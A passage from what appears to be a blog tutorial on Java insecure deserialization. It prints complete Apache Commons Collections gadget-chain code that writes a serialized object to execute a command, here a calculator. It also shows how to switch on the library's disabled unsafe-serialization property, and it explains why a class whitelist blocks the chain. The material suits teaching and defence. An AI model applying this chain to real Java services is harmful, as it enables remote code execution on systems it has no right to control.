+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Objects</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept13</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;getMethod&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&quot;getRuntime&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;invoke&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;exec&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&quot;/usr/bin/gnome-calculator&quot;</span><span class="o">}),</span>
+</span><span class='line'>            <span class="o">};</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Transformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">HashMap</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>  <span class="c1">// calls =&gt; chainedTransformer.transform()</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="s">&quot;invalid_key&quot;</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// Create a TiedMapEntry with the underlying hashmap as our `lazyMap` and invalid_key</span>
+</span><span class='line'>            <span class="n">TiedMapEntry</span> <span class="n">tidemapentry</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span> <span class="n">key</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">HashBag</span> <span class="n">hashBag</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">HashBag</span><span class="o">();</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">hashBag</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nf">Object</span><span class="o">());</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// set HashBag’s underlying HashMap table’s first entry’s KEY to be our TiedMapEntry</span>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">internalMap</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Whitebox</span><span class="o">.</span><span class="na">getInternalState</span><span class="o">(</span><span class="n">hashBag</span><span class="o">,</span> <span class="s">&quot;map&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">Object</span><span class="o">[]</span> <span class="n">nodesArray</span> <span class="o">=</span> <span class="o">(</span><span class="n">Object</span><span class="o">[])</span> <span class="n">Whitebox</span><span class="o">.</span><span class="na">getInternalState</span><span class="o">(</span><span class="n">internalMap</span><span class="o">,</span> <span class="s">&quot;table&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">Object</span> <span class="n">node</span> <span class="o">=</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">stream</span><span class="o">(</span><span class="n">nodesArray</span><span class="o">)</span>
+</span><span class='line'>                    <span class="o">.</span><span class="na">filter</span><span class="o">(</span><span class="nl">Objects:</span><span class="o">:</span><span class="n">nonNull</span><span class="o">)</span>
+</span><span class='line'>                    <span class="o">.</span><span class="na">findFirst</span><span class="o">()</span>
+</span><span class='line'>                    <span class="o">.</span><span class="na">orElseThrow</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="s">&quot;this can&#39;t happen&quot;</span><span class="o">));</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Whitebox</span><span class="o">.</span><span class="na">setInternalState</span><span class="o">(</span><span class="n">node</span><span class="o">,</span> <span class="s">&quot;key&quot;</span><span class="o">,</span> <span class="n">tidemapentry</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">fileName</span> <span class="o">=</span> <span class="s">&quot;bad_serialized_object.ser&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="c1">// serializing an object</span>
+</span><span class='line'>            <span class="n">FileOutputStream</span> <span class="n">fout</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">FileOutputStream</span><span class="o">(</span><span class="n">fileName</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">ObjectOutputStream</span> <span class="n">oout</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ObjectOutputStream</span><span class="o">(</span><span class="n">fout</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">oout</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashBag</span><span class="o">);</span>   <span class="c1">// actual serialization</span>
+</span><span class='line'>            <span class="n">oout</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">fout</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;\nThe object was written to &quot;</span> <span class="o">+</span> <span class="n">fileName</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>However, the above code does not produce the serialized object properly.</p>
+
+<p>It throws <code>java.lang.UnsupportedOperationException</code>.</p>
+
+<pre><code class="bash">[SNIPPED]
+java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.
+    at org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)
+    at org.apache.commons.collections.functors.InvokerTransformer.writeObject(InvokerTransformer.java:155)
+    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+
+[SNIPPED]
+</code></pre>
+
+<p>It seems that the <code>Java Security Manager</code> detects the known <code>bad</code> gadgets.</p>
+
+<p>By default, serialization support for <code>org.apache.commons.collections.functors.InvokerTransformer</code> is <code>disabled</code>.</p>
+
+<pre><code class="java">// enable the support in both producer and consumer programs to serialize / deserialize the object without any exception
+System.setProperty(
+                    "org.apache.commons.collections.enableUnsafeSerialization",
+                    "true");
+</code></pre>
+
+<h3>Final Exploit Code</h3>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.bag.HashBag</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.mockito.internal.util.reflection.Whitebox</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Objects</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept14</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>             <span class="c1">// set the System.setProperty()</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;true&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;getMethod&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&quot;getRuntime&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;invoke&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;exec&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&quot;/usr/bin/gnome-calculator&quot;</span><span class="o">}),</span>
+</span><span class='line'>            <span class="o">};</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Transformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">HashMap</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>  <span class="c1">// called =&gt; chainedTransformer.transform()</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="s">&quot;invalid_key&quot;</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// Create a TiedMapEntry with the underlying hashmap as our `lazyMap` and invalid_key</span>
+</span><span class='line'>            <span class="n">TiedMapEntry</span> <span class="n">tidemapentry</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span> <span class="n">key</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">HashBag</span> <span class="n">hashBag</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">HashBag</span><span class="o">();</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">hashBag</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nf">Object</span><span class="o">());</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// set HashBag’s underlying HashMap table’s first entry’s KEY to be our TiedMapEntry</span>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">internalMap</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Whitebox</span><span class="o">.</span><span class="na">getInternalState</span><span class="o">(</span><span class="n">hashBag</span><span class="o">,</span> <span class="s">&quot;map&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">Object</span><span class="o">[]</span> <span class="n">nodesArray</span> <span class="o">=</span> <span class="o">(</span><span class="n">Object</span><span class="o">[])</span> <span class="n">Whitebox</span><span class="o">.</span><span class="na">getInternalState</span><span class="o">(</span><span class="n">internalMap</span><span class="o">,</span> <span class="s">&quot;table&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">Object</span> <span class="n">node</span> <span class="o">=</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">stream</span><span class="o">(</span><span class="n">nodesArray</span><span class="o">)</span>
+</span><span class='line'>                    <span class="o">.</span><span class="na">filter</span><span class="o">(</span><span class="nl">Objects:</span><span class="o">:</span><span class="n">nonNull</span><span class="o">)</span>
+</span><span class='line'>                    <span class="o">.</span><span class="na">findFirst</span><span class="o">()</span>
+</span><span class='line'>                    <span class="o">.</span><span class="na">orElseThrow</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="s">&quot;this can&#39;t happen&quot;</span><span class="o">));</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Whitebox</span><span class="o">.</span><span class="na">setInternalState</span><span class="o">(</span><span class="n">node</span><span class="o">,</span> <span class="s">&quot;key&quot;</span><span class="o">,</span> <span class="n">tidemapentry</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">fileName</span> <span class="o">=</span> <span class="s">&quot;bad_serialized_object_concept13.ser&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="c1">// serializing an object</span>
+</span><span class='line'>            <span class="n">FileOutputStream</span> <span class="n">fout</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">FileOutputStream</span><span class="o">(</span><span class="n">fileName</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">ObjectOutputStream</span> <span class="n">oout</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ObjectOutputStream</span><span class="o">(</span><span class="n">fout</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">oout</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashBag</span><span class="o">);</span>   <span class="c1">// actual serialization</span>
+</span><span class='line'>            <span class="n">oout</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">fout</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;\nThe object was written to &quot;</span> <span class="o">+</span> <span class="n">fileName</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/image-20191121213224578.png" alt="" /></p>
+
+<h3>Video Walkthrough: Debugging the Deserialization Flow</h3>
+
+<p><a href="https://vimeo.com/374834418"><img src="/artifacts/insecure_deserialization_java.assets/image-20191121223509399.png" alt="Demystifying a Gadget Chain - Java Deserialization" /></a></p>
+
+<h2>Final Thoughts</h2>
+
+<p>If we fix our code and use the <code>safeObjectInputStream</code> during deserialization, then the following things happen while unwrapping the serialized object:</p>
+
+<ol>
+<li>First, it resolves the <code>HashBag</code> Class.</li>
+<li>Then it checks if that class is present inside the <code>whitelist.</code>
+
+<ul>
+<li>If that class <code>IS_NOT_FOUND</code> inside the <code>whitelist,</code> then it throws <code>Exception.</code></li>
+<li>We don&rsquo;t have <code>HashBag</code> in our whitelist. So then we&rsquo;ll get the <code>Exception,</code> and the attack won&rsquo;t be successful.</li>
+</ul>
+</li>
+</ol>
+
+
+<p>However, if that class <code>IS_FOUND</code> inside the <code>whitelist,</code> then it tries to resolve the next wrapped class (in our case that is <code>TiedMapEntry</code>) and repeats step 2.</p>
+
+<blockquote><p>If all classes wrapped in the <code>serialized</code> object are present inside our <code>whitelist,</code> then the entire process won&rsquo;t continue, and we can anticipate the <code>calculator</code> again.</p></blockquote>
+
+<p><code>whitelist</code> the following classes to run <code>calculator.</code></p>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashSet</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Set</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SafeDeserializeRCE</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;true&quot;</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// file name of the deserialized object</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">fname</span> <span class="o">=</span> <span class="s">&quot;../Serialization/bad_serialized_object.ser&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="n">FileInputStream</span> <span class="n">fin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">FileInputStream</span><span class="o">(</span><span class="n">fname</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// whitelist all classes for RCE</span>
+</span><span class='line'>            <span class="n">Set</span> <span class="n">rce_whitelist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="s">&quot;org.apache.commons.collections.bag.HashBag&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.keyvalue.TiedMapEntry&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.map.LazyMap&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;[Lorg.apache.commons.collections.Transformer;&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.functors.ConstantTransformer&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.lang.Runtime&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;[Ljava.lang.Object;&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;[Ljava.lang.Class;&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.lang.String&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.lang.Object&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;[Ljava.lang.String;&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.lang.Integer&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.lang.Number&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.util.HashMap&quot;</span><span class="o">));</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">ObjectInputStream</span> <span class="n">oin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SafeObjectInputStream</span><span class="o">(</span><span class="n">fin</span><span class="o">,</span> <span class="n">rce_whitelist</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// expecting a User type obj, actual deserialization happens here</span>
+</span><span class='line'>            <span class="n">User</span> <span class="n">a</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span> <span class="n">oin</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">oin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">fin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;\nThe object was read from &quot;</span> <span class="o">+</span> <span class="n">fname</span> <span class="o">+</span> <span class="s">&quot;:&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
